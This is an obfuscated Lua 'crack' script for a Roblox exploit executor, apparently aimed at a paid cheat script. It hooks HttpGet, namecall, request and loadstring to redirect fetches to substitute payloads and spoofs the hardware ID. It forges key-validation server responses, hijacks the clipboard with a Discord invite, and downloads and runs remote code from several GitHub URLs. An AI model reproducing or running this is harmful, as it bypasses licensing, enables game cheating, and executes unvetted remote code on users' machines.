string.char(83, 107, 105, 108, 108, 32, 105, 115, 115, 117, 101)
setmetatable({}, {
    __index = function(_, p1)
        return p1 == 'crack_src' and 'Keep trying lil bro' or 'Not found'
    end,
})
spawn(function()
    loadstring([[setclipboard("https://discord.gg/vRJHTFfndh")local screenSize=workspace.CurrentCamera.ViewportSize;local fadeTime=2.5;local bg=Drawing.new("Square")bg.Size=Vector2.new(screenSize.X*1.5,screenSize.Y*1.5)bg.Position=Vector2.new(-screenSize.X*0.25,-screenSize.Y*0.25)bg.Color=Color3.fromRGB(20,20,30)bg.Filled=true;bg.Transparency=1;bg.Visible=true;local textBox=Drawing.new("Text")textBox.Text="crack made by venox & doitenroi!\ndiscord copied!!"textBox.Font=Drawing.Fonts.System;textBox.Size=screenSize.X/50;textBox.Position=Vector2.new(screenSize.X/2,screenSize.Y*0.6)textBox.Color=Color3.fromRGB(255,75,95)textBox.Center=true;textBox.Transparency=1;textBox.Visible=true;task.wait(3.5)local startTime=tick()repeat local progress=(tick()-startTime)/fadeTime;local alpha=math.max(0,1-progress)bg.Transparency=alpha;textBox.Transparency=alpha;task.wait()until progress>=1;bg:Remove()textBox:Remove()]])()
end)

getgenv().yetexecuted = true
getgenv = getgenv or function()
    return _G
end
isourclosure = nil
isfunctionhooked = nil
isexecutorclosure = nil
islclosure = nil
getgenv().startTime = tick()
_print = print

local _method = getgenv().method
local _option = getgenv().option

getgenv().option = nil
getgenv().method = nil

local u4, u5

if _option == 'free' then
    u4 = 'free'
    u5 = 3
elseif _option == 'premium' then
    u4 = 'premium'
    u5 = 2
elseif _option == 'sponsor' then
    u4 = 'userm'
    u5 = 1
else
    _print('Unknown option, using free key option')

    u4 = 'free'
    u5 = 3
end

os = setmetatable({
    time = function()
        return 0
    end,
}, {__index = os})

local v6 = game
local u7 = string.gsub(game:GetService('HttpService'):GenerateGUID(false), '-', ''):sub(1, 32)

local function v11(p8)
    local v9 = ''
    local v10 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    for _ = 1, p8 do
        v9 = v9 .. v10:sub(math.random(#v10), math.random(#v10))
    end

    return v9
end

local u12 = 'https://' .. v11(3) .. '.' .. v11(2) .. '.com/' .. v11(3)
local u13 = math.random(1000, 9999)
local u14 = {
    [u12] = u13,
    ['https://gist.githubusercontent.com/8bits4ya/cd24266ac197a6ffeaee92b8e5246531/raw/33cc8167ceae095a9a93e3e84b8b0ca02d240145/gistfile1.txt'] = v6:HttpGet('https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/sources/8bit/33cc8167ceae095a9a93e3e84b8b0ca02d240145'),
    ['https://gist.githubusercontent.com/8bits4ya/34e99dc2d2f02d65a0607a3eef48b62d/raw/7ce32956279900373a8e67351f2cf8f770dda19c/gistfile1.txt'] = v6:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/frame.md'),
    ['https://gist.githubusercontent.com/8bits4ya/eef872b31191c19803ff3dc9c54e7b13/raw/8bfaa4909b5729b5315b1ffc4840115ec8f3ca75/gistfile1.txt'] = v6:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/nan1.lua'),
    ['https://raw.githubusercontent.com/perfectBlue0X/the-rivals/refs/heads/main/8bitfluent.lua'] = v6:HttpGet('https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/sources/8bit/8bitfluent.lua'),
    ['https://gist.githubusercontent.com/8bits4ya/088f795d94e39889f117bc7d50a68eee/raw/eca550022fd5027b4348efb0be594df368bce16c/gistfile1.txt'] = v6:HttpGet('https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/sources/8bit/eca550022fd5027b4348efb0be594df368bce16c'),
    ['https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/firsthopper'] = v6:HttpGet('https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/sources/8bit/firsthopper'),
    ['https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/hopper.lua'] = v6:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/nan1.lua'),
    ['https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/nan1.lua'] = v6:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/nan1.lua'),
    ['https://test-nine-tau-24.vercel.app'] = v6:HttpGet('https://rawcommunity.COM'),
}
local u15 = 'venoxWasHere'

writefile('8bit.txt', u15)

getgenv().gethwid = function()
    return u7
end
get_hwid = gethwid

local function v19(p16)
    hookfunction(game[p16], function(p17, p18, ...)
        if getgenv().blockrequests then
            return 'Your HTTP Request has been intercepted.'
        elseif u14[p18] then
            return u14[p18]
        else
            return oldHook(p17, p18, ...)
        end
    end)
end

if type(hookmetamethod) ~= 'function' or type(hookfunction) ~= 'function' then
    print('fallback proxy--by venox')

    local u20 = game
    local v24 = {
        __index = function(_, p21)
            local u22 = u20[p21]

            return (p21 == 'HttpGet' or p21 == 'HttpGetAsync') and function(_, p23, ...)
                if u14[p23] then
                    return u14[p23]
                else
                    return u20[p21](u20, p23, ...)
                end
            end or (type(u22) == 'function' and function(_, ...)
                return u22(u20, ...)
            end or u22)
        end,
    }

    game = setmetatable({}, v24)
else
    print('U1--by venox')
    v19('HttpGet')

    if game.HttpGetAsync ~= game.HttpGet then
        v19('HttpGetAsync')
    end

    local u25 = nil

    u25 = hookmetamethod(game, '__namecall', function(p26, ...)
        local v27 = {...}
        local v28 = getnamecallmethod()

        if v28 == 'HttpGet' or v28 == 'HttpGetAsync' then
            print('Intercepted Namecall:', v28, '-> URL:', v27[1])

            if getgenv().blockrequests then
                return 'Your HTTP Request has been intercepted.'
            elseif u14[v27[1] ] then
                return u14[v27[1] ]
            else
                return u25(p26, ...)
            end
        else
            return u25(p26, ...)
        end
    end)
end

_print('1/2')

local u29 = game:GetService('RbxAnalyticsService'):GetClientId()
local u30 = request

function request(p31)
    if p31.Url:find('https://dev-8bitsforya.pantheonsite.io/raw/') then
        _print('prevented logger!!')

        return {
            status = 200,
            Body = 'Webhook sent successfully.',
        }
    end
    if p31 and p31.Url:find('https://discord.com/api/webhooks') then
        _print('Webhook URL detected:')
        _print('Url: ' .. tostring(p31.Url))

        return false
    end
    if _method ~= '1' or not p31.Url:find('https://work.ink/_api/v2/token/isValid') then
        return _method == '2' and p31.Url:find('auth.php') and {
            status = 200,
            Body = game.HttpService:JSONEncode({
                valid = 'true',
                error = nil,
                key = u15,
                hwid = u29,
                userlvl = u4,
                nrklvl = u5,
                expiry = os.time() * 1000000 + math.random(86000000, 90000000),
                expiresAfter = os.time() * 1000000 + math.random(86000000, 90000000),
                hello = 'venox was here',
            }),
        } or u30(p31)
    end

    local _isValid = p31.Url:match('isValid/(.+)')

    if _isValid and _isValid == u15 then
        return {
            status = 200,
            Body = game.HttpService:JSONEncode({
                valid = true,
                deleted = false,
                info = {
                    token = u15,
                    createdAt = os.time() * 1000,
                    byIp = string.format('%d.%d.%d.%d', math.random(1, 255), math.random(0, 255), math.random(0, 255), math.random(1, 255)),
                    linkId = 777453,
                    expiresAfter = os.time() * 1000 + math.random(86000000, 90000000),
                    hello = 'venox was here',
                },
            }),
        }
    end

    _print('use key venoxWasHere!')

    return {
        Body = '{"valid":false}',
    }
end

httprequest = request
httpRequest = request
http_request = request
HttpPost = request

local u33 = setclipboard

function setclipboard()
    return u33('https://discord.gg/vRJHTFfndh')
end

_get = getgenv().HttpGet or function(p34)
    return p34
end
getgenv().HttpGet = function(p35)
    if u14[p35] then
        return u14[p35]
    else
        return _get(p35)
    end
end
_ols = loadstring

function loadstring(p36, ...)
    return (not p36 or p36 == nil) and function(p37)
        return p37
    end or _ols(p36, ...)
end

local v38 = pcall(function()
    return game:GetService('RbxAnalyticsService'):GetClientId() == u29
end)

if not v38 then
    error('Proxy test failed! Cannot proceed.')
end

local v39 = pcall(function()
    return game:HttpGet(u12) == u13
end)

if not v39 then
    error('URL spoof test failed! Cannot proceed.')
end

getgenv().Method = nil
_qot = queue_on_teleport

function queue_on_teleport(p40)
    p40:gsub('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/nan1.lua', 'https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/main.lua')

    return _qot('getgenv().method = "2";getgenv().option = "premium";' .. p40)
end

getgenv().Fluent = loadstring(game:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/frame.md'))()

if v39 and v38 then
    _print('Initiated and tests passed!')
    _print('Loading 8bit.lua crack..')

    if not getgenv().NameLoaderLoaded then
        loadstring(game:HttpGet('https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/firsthopper'))()

        return
    end

    loadstring(game:HttpGet('https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/nan.lua'))()
end
